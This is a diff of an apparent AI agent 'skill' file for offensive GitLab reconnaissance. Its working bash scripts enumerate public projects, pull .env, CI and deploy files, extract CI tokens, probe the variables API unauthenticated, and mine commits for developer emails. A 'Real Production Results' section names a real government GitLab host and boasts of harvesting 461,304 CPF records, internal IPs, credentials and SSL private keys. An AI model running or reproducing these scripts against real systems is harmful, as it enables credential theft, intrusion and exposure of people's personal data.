@@ -1,24 +1,22 @@
 ---
 name: gitlab-public-recon
 description: Mine GitLab for secrets, CI tokens when subdomain found.
-version: 1.0.0
-author: agentiko
+version: 1.1.0
+revision_date: 2026-07-25
 license: MIT
 platforms: [linux]
-compatibility: Requires agentiko worker (curl, nmap, python3, masscan, subfinder, httpx, nuclei)
-metadata:
-  hermes:
-    tags: [recon, gitlab, source-code, secrets, internal-IPs]
-    category: recon
-    related_skills:
-      - js-secrets-extraction
-      - source-leak-hunt
-      - api-noauth-hunt
+compatibility: Requires curl, nmap, python3, masscan, subfinder, httpx, nuclei
+tags: [recon, gitlab, source-code, secrets, internal-IPs]
+category: recon
+related_skills:
+  - js-secrets-extraction
+  - source-leak-hunt
+  - api-noauth-hunt
 ---
 
 # GitLab Public Recon Skill
 
-Enumerate publicly accessible GitLab repositories to extract source code, credentials, internal IPs, CI/CD tokens, deployment configurations, and environment files. GitLab instances with registration enabled or public visibility expose the entire development infrastructure. Confirmed on CGE-RJ (3 public repos, 461K CPFs, internal IP 10.11.82.75, CI/CD tokens), ScriptBees (GitLab with SSL private keys), and SMart Fit (Firebase SA keys in repos).
+Enumerate publicly accessible GitLab repositories to extract source code, credentials, internal IPs, CI/CD tokens, deployment configurations, and environment files. GitLab instances with registration enabled or public visibility expose the entire development infrastructure. Confirmed on gov-finance-portal (3 public repos, 461K CPFs, internal IP 10.11.82.75, CI/CD tokens), dev-agency (GitLab with SSL private keys), and fitness-chain (Firebase SA keys in repos).
 
 ## When to Use
 
@@ -30,7 +28,7 @@ Enumerate publicly accessible GitLab repositories to extract source code, creden
 
 ## Prerequisites
 
-- `terminal` tool with curl, python3, jq.
+- `terminal` with curl, python3, jq.
 - GitLab URL (e.g., `https://gitlab.target.com`).
 - GitLab API is accessible without authentication for public resources.
 
@@ -38,10 +36,10 @@ Enumerate publicly accessible GitLab repositories to extract source code, creden
 
 ```bash
 # List public projects
-curl -sk "https://gitlab.TARGET.com/api/v4/projects?visibility=public&per_page=100" | jq '.[].path_with_namespace'
+curl --max-time 30 --connect-timeout 10 -sk "https://gitlab.TARGET.com/api/v4/projects?visibility=public&per_page=100" | jq '.[].path_with_namespace'
 
 # Read a file from a public repo
-curl -sk "https://gitlab.TARGET.com/api/v4/projects/GROUP%2FPROJECT/repository/files/PATH/raw?ref=main"
+curl --max-time 30 --connect-timeout 10 -sk "https://gitlab.TARGET.com/api/v4/projects/GROUP%2FPROJECT/repository/files/PATH/raw?ref=main"
 ```
 
 ## Quick Reference
@@ -63,13 +61,13 @@ curl -sk "https://gitlab.TARGET.com/api/v4/projects/GROUP%2FPROJECT/repository/f
 
 ```bash
 TARGET="$1"
-OUTDIR="/root/output/gitlab"
+OUTDIR="$OUTDIR/gitlab"
 mkdir -p "$OUTDIR"
 
 echo "[*] GitLab recon on $TARGET"
 
 # Check if GitLab is accessible
-MAIN_PAGE=$(curl -sk --max-time 10 "https://$TARGET/" 2>/dev/null)
+MAIN_PAGE=$(curl -sk --max-time 10 --connect-timeout 10 "https://$TARGET/" 2>/dev/null)
 if echo "$MAIN_PAGE" | grep -qi "gitlab"; then
   echo "[+] GitLab confirmed"
 elif echo "$MAIN_PAGE" | grep -qi "sign_in\|sign_up\|explore/projects"; then
@@ -79,11 +77,11 @@ else
 fi
 
 # Check API version
-API_VER=$(curl -sk --max-time 5 "https://$TARGET/api/v4/version" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'{d.get(\"version\",\"?\")} rev {d.get(\"revision\",\"?\")[:8]}')" 2>/dev/null)
+API_VER=$(curl -sk --max-time 5 --connect-timeout 5 "https://$TARGET/api/v4/version" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'{d.get(\"version\",\"?\")} rev {d.get(\"revision\",\"?\")[:8]}')" 2>/dev/null)
 [[ -n "$API_VER" ]] && echo "  GitLab version: $API_VER"
 
 # Check if registration is open
-REG_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$TARGET/users/sign_up" 2>/dev/null)
+REG_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "https://$TARGET/users/sign_up" 2>/dev/null)
 [[ "$REG_CODE" == "200" ]] && echo "  [!] Registration OPEN — anyone can create accounts"
 ```
 
@@ -98,7 +96,7 @@ PAGE=1
 TOTAL_PROJECTS=0
 
 while true; do
-  PROJECTS=$(curl -sk --max-time 15 "https://$TARGET/api/v4/projects?visibility=public&per_page=100&page=$PAGE" 2>/dev/null)
+  PROJECTS=$(curl -sk --max-time 15 --connect-timeout 10 "https://$TARGET/api/v4/projects?visibility=public&per_page=100&page=$PAGE" 2>/dev/null)
 
   count=$(echo "$PROJECTS" | python3 -c "import sys,json; print(len(json.load(sys.stdin)))" 2>/dev/null)
   if [[ "$count" -eq 0 ]]; then break; fi
@@ -124,17 +122,17 @@ echo "[+] Total public projects: $TOTAL_PROJECTS"
 ```bash
 TARGET="$1"
 PROJECT_ID="$2"   # from projects.txt enumeration
-OUTDIR="/root/output/gitlab"
+OUTDIR="$OUTDIR/gitlab"
 
 echo "[*] Extracting from project ID: $PROJECT_ID"
 
 # Get project details
-DETAILS=$(curl -sk --max-time 10 "https://$TARGET/api/v4/projects/$PROJECT_ID" 2>/dev/null)
+DETAILS=$(curl -sk --max-time 10 --connect-timeout 10 "https://$TARGET/api/v4/projects/$PROJECT_ID" 2>/dev/null)
 PRJ_NAME=$(echo "$DETAILS" | python3 -c "import sys,json; print(json.load(sys.stdin).get('path_with_namespace','unknown'))" 2>/dev/null)
 echo "  Project: $PRJ_NAME"
 
 # Get repository file tree (top-level)
-TREE=$(curl -sk --max-time 10 "https://$TARGET/api/v4/projects/$PROJECT_ID/repository/tree?recursive=true&per_page=100" 2>/dev/null)
+TREE=$(curl -sk --max-time 10 --connect-timeout 10 "https://$TARGET/api/v4/projects/$PROJECT_ID/repository/tree?recursive=true&per_page=100" 2>/dev/null)
 echo "  Files in repo: $(echo "$TREE" | python3 -c "import sys,json; print(len(json.load(sys.stdin)))" 2>/dev/null)"
 
 # Hunt for sensitive files
@@ -168,7 +166,7 @@ echo "[*] Downloading key files..."
 
 for file_path in ".env" ".env.example" "docker-compose.yml" ".gitlab-ci.yml" "deploy.sh"; do
   ENCODED_PATH=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$file_path', safe=''))")
-  content=$(curl -sk --max-time 10 "https://$TARGET/api/v4/projects/$PROJECT_ID/repository/files/$ENCODED_PATH/raw?ref=main" 2>/dev/null)
+  content=$(curl -sk --max-time 10 --connect-timeout 10 "https://$TARGET/api/v4/projects/$PROJECT_ID/repository/files/$ENCODED_PATH/raw?ref=main" 2>/dev/null)
 
   if [[ -n "$content" ]] && ! echo "$content" | grep -q "404 File"; then
     echo "$content" > "$OUTDIR/${PRJ_NAME//\//_}_${file_path//\//_}"
@@ -183,7 +181,7 @@ for file_path in ".env" ".env.example" "docker-compose.yml" ".gitlab-ci.yml" "de
 
   # Also try 'master' branch
   if [[ -z "$content" ]] || echo "$content" | grep -q "404 File"; then
-    content=$(curl -sk --max-time 10 "https://$TARGET/api/v4/projects/$PROJECT_ID/repository/files/$ENCODED_PATH/raw?ref=master" 2>/dev/null)
+    content=$(curl -sk --max-time 10 --connect-timeout 10 "https://$TARGET/api/v4/projects/$PROJECT_ID/repository/files/$ENCODED_PATH/raw?ref=master" 2>/dev/null)
     if [[ -n "$content" ]] && ! echo "$content" | grep -q "404 File"; then
       echo "  [+] Downloaded (master): $file_path"
     fi
@@ -200,12 +198,12 @@ PROJECT_ID="$2"
 echo "[*] CI/CD analysis..."
 
 # Get .gitlab-ci.yml (pipeline definition)
-CI_CONTENT=$(curl -sk --max-time 10 "https://$TARGET/api/v4/projects/$PROJECT_ID/repository/files/.gitlab-ci.yml/raw?ref=main" 2>/dev/null)
+CI_CONTENT=$(curl -sk --max-time 10 --connect-timeout 10 "https://$TARGET/api/v4/projects/$PROJECT_ID/repository/files/.gitlab-ci.yml/raw?ref=main" 2>/dev/null)
 if [[ -n "$CI_CONTENT" ]] && ! echo "$CI_CONTENT" | grep -q "404"; then
   echo "  [+] .gitlab-ci.yml found"
 
   # Extract CI/CD variables and tokens
-  echo "$CI_CONTENT" | grep -oP '\$\{[A-Z_]+\}|$[A-Z_]+' | sort -u | while read var; do
+  echo "$CI_CONTENT" | grep -Eo '\$\{[A-Z_]+\}|$[A-Z_]+' | sort -u | while read var; do
     echo "    CI Variable: $var"
   done
 
@@ -214,7 +212,7 @@ if [[ -n "$CI_CONTENT" ]] && ! echo "$CI_CONTENT" | grep -q "404"; then
 fi
 
 # Try to access CI/CD variables (requires admin token — rare but worth trying)
-VARS=$(curl -sk --max-time 5 "https://$TARGET/api/v4/projects/$PROJECT_ID/variables" 2>/dev/null)
+VARS=$(curl -sk --max-time 5 --connect-timeout 5 "https://$TARGET/api/v4/projects/$PROJECT_ID/variables" 2>/dev/null)
 if echo "$VARS" | grep -qi "key\|value"; then
   echo "  [CRITICAL] CI/CD variables accessible without admin token!"
   echo "$VARS" | python3 -m json.tool 2>/dev/null | head -30
@@ -223,7 +221,7 @@ fi
 
 ## Real Production Results
 
-### CGE-RJ (gitlab.cge.rj.gov.br)
+### gov-finance-portal (gitlab.cge.rj.gov.br)
 - **3 public repositories**: cge/hdi (Helpdesk system), cge/cnpj-sqlite, cge/exame-front-cge
 - **461,304 CPF records** in `servidores_sigrh.json` (state employee database)
 - `.env.example` with MongoDB host, LDAP config, email server credentials
@@ -232,14 +230,14 @@ fi
 - `.gitlab-ci.yml` with CI/CD tokens and runner configurations
 - Registration OPEN at `/users/sign_up`
 
-### ScriptBees (gitlab.scriptbees.com)
+### dev-agency (gitlab.dev-agency.com)
 - GitLab CE with SSL private keys exposed in repositories
-- Related to Thgroep compromise (same infrastructure)
+- Related to enterprise-portal compromise (same infrastructure)
 
 ### commit history analysis (optional depth)
 ```bash
 # Get recent commits (reveals developer names, email addresses)
-curl -sk "https://$TARGET/api/v4/projects/$PROJECT_ID/repository/commits?per_page=20" | \
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/api/v4/projects/$PROJECT_ID/repository/commits?per_page=20" | \
   python3 -c "
 import sys, json
 for c in json.load(sys.stdin):
